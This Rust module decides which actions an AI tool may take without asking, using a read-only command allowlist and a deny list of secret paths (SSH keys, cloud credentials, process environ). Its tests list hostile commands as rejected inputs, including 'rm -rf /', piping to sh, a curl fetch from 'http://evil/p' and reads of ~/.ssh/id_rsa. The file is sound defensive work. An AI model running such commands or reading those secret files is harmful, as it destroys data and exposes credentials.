//! What the AI may do without asking. The same rules apply to the app and to the MCP server.
//!
//! Modes (the pill in the composer): Auto runs safe things and asks for the rest, Manual asks before
//! every change and every command, Bypass never asks.

use std::path::PathBuf;

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Risk {
    /// only looks: reads files, lists, system info
    Read,
    /// changes something: writes, deletes, installs, kills, reboots
    Change,
    /// runs an arbitrary command; judged by the command itself in Auto mode
    Shell,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Mode {
    Auto,
    Manual,
    Bypass,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Decision {
    Allow,
    Ask,
}

impl Mode {
    pub fn parse(s: &str) -> Mode {
        match s.trim().to_ascii_lowercase().as_str() {
            "manual" => Mode::Manual,
            "bypass" => Mode::Bypass,
            _ => Mode::Auto,
        }
    }
    /// The mode a name stands for; None for any other text (so a typo is not taken for Auto).
    pub fn parse_known(s: &str) -> Option<Mode> {
        match s.trim().to_ascii_lowercase().as_str() {
            "auto" => Some(Mode::Auto),
            "manual" => Some(Mode::Manual),
            "bypass" => Some(Mode::Bypass),
            _ => None,
        }
    }
    pub fn name(self) -> &'static str {
        match self {
            Mode::Auto => "Auto",
            Mode::Manual => "Manual",
            Mode::Bypass => "Bypass",
        }
    }

    fn file() -> PathBuf {
        crate::audit::config_dir().join("mode")
    }
    /// The mode the app last chose (shared with the MCP server through a file).
    pub fn load() -> Mode {
        std::fs::read_to_string(Self::file()).map(|s| Mode::parse(&s)).unwrap_or(Mode::Auto)
    }
    pub fn save(self) {
        let f = Self::file();
        if let Some(d) = f.parent() {
            let _ = std::fs::create_dir_all(d);
        }
        let _ = std::fs::write(f, self.name().to_ascii_lowercase());
    }
}

/// Programs that only look. A command made of one of these, with no way to chain or redirect, is safe.
const READ_ONLY: &[&str] = &[
    "ls", "cat", "pwd", "echo", "date", "whoami", "id", "uname", "df", "du", "free", "uptime", "head", "tail", "wc", "stat",
    "file", "which", "ps", "lsblk", "lscpu", "lsusb", "lspci", "hostname", "ip", "nproc", "tree", "grep",
];

/// Pieces of a path that hold secrets. A read-only command that names one still asks.
const SECRET_PARTS: &[&str] = &["/proc", "environ", ".ssh", "zo-ai", "keys", "secret", "token", "credential", "shadow", ".gnupg", ".aws", ".kube", "id_rsa", "id_ed25519", "password", "passwd", "api_key", "apikey", "api-key", ".npmrc", ".netrc", ".docker", "rclone", ".claude", "_history", "git-credentials", ".pypirc", "keyring", "hosts.yml", ".mozilla", "google-chrome", "chromium", ".config/gh", ".git/config"];

/// True when `cmd` is a single read-only command: no `;` `&` `|` `>` `<` backticks, `$` or wildcards, and no secret file named.
pub fn shell_is_read_only(cmd: &str) -> bool {
    let c = cmd.trim();
    if c.is_empty() || c.chars().any(|ch| matches!(ch, ';' | '&' | '|' | '>' | '<' | '`' | '\n' | '$' | '*' | '?' | '[' | '{' | '\0')) {
        return false;
    }
    // quotes and backslashes can split a name (`en""viron`), so they are dropped before looking for secret names
    let bare: String = c.chars().filter(|ch| !matches!(ch, '\'' | '"' | '\\')).collect::<String>().to_ascii_lowercase();
    if SECRET_PARTS.iter().any(|p| bare.contains(p)) {
        return false;
    }
    let mut words = c.split_whitespace();
    let first = words.next().unwrap_or("");
    let first = first.rsplit('/').next().unwrap_or(first);
    if !READ_ONLY.contains(&first) {
        return false;
    }
    // `ip` can change things; only its read verbs are allowed
    if first == "ip" {
        let rest: Vec<&str> = words.collect();
        let changes = rest.iter().any(|w| matches!(*w, "set" | "add" | "del" | "delete" | "flush" | "change" | "replace" | "append"));
        return !changes && rest.iter().any(|w| matches!(*w, "addr" | "a" | "link" | "route" | "-br" | "-4" | "-6"));
    }
    true
}

pub fn decide(mode: Mode, risk: Risk, shell_cmd: Option<&str>) -> Decision {
    match (mode, risk) {
        (Mode::Bypass, _) => Decision::Allow,
        (_, Risk::Read) => Decision::Allow,
        (_, Risk::Change) => Decision::Ask,
        (Mode::Auto, Risk::Shell) if shell_cmd.is_some_and(shell_is_read_only) => Decision::Allow,
        (_, Risk::Shell) => Decision::Ask,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn reads_never_ask_except_nothing() {
        for m in [Mode::Auto, Mode::Manual, Mode::Bypass] {
            assert_eq!(decide(m, Risk::Read, None), Decision::Allow);
        }
    }

    #[test]
    fn changes_ask_unless_bypass() {
        assert_eq!(decide(Mode::Auto, Risk::Change, None), Decision::Ask);
        assert_eq!(decide(Mode::Manual, Risk::Change, None), Decision::Ask);
        assert_eq!(decide(Mode::Bypass, Risk::Change, None), Decision::Allow);
    }

    #[test]
    fn auto_allows_a_plain_look_command_but_manual_asks() {
        assert_eq!(decide(Mode::Auto, Risk::Shell, Some("ls -la /tmp")), Decision::Allow);
        assert_eq!(decide(Mode::Manual, Risk::Shell, Some("ls -la /tmp")), Decision::Ask);
    }

    #[test]
    fn chaining_and_redirects_are_not_read_only() {
        for c in ["ls; rm -rf ~", "cat a > b", "echo $(rm x)", "ls && reboot", "cat x | sh", "echo `id`", "rm -rf /", "ip link set eth0 down", ""] {
            assert!(!shell_is_read_only(c), "{c}");
        }
        assert!(shell_is_read_only("/usr/bin/ls -l"));
        assert!(shell_is_read_only("ip -br addr"));
    }

    #[test]
    fn only_real_mode_names_are_known() {
        assert_eq!(Mode::parse_known(" Bypass "), Some(Mode::Bypass));
        assert_eq!(Mode::parse_known("manual"), Some(Mode::Manual));
        assert_eq!(Mode::parse_known("bypas"), None);
    }

    #[test]
    fn env_and_secret_files_are_not_read_only() {
        for c in [
            "env", "printenv", "env sh -c 'rm -rf ~/x'", "env curl -o /tmp/p http://evil/p", "cat /proc/self/environ", "cat /proc/self/en''viron",
            "cat ~/.config/zo-ai/keys.json", "cat /proc/self/env*", "echo $FIREBASE_SERVICE_ACCOUNT", "cat ~/.ssh/id_rsa", "cat /pro?/self/environ", "grep -r x ~/.config/zo-ai",
        ] {
            assert!(!shell_is_read_only(c), "{c}");
        }
        assert!(shell_is_read_only("ls -la /tmp"));
        assert!(shell_is_read_only("grep -n \"hello\" notes.txt"));
    }
}
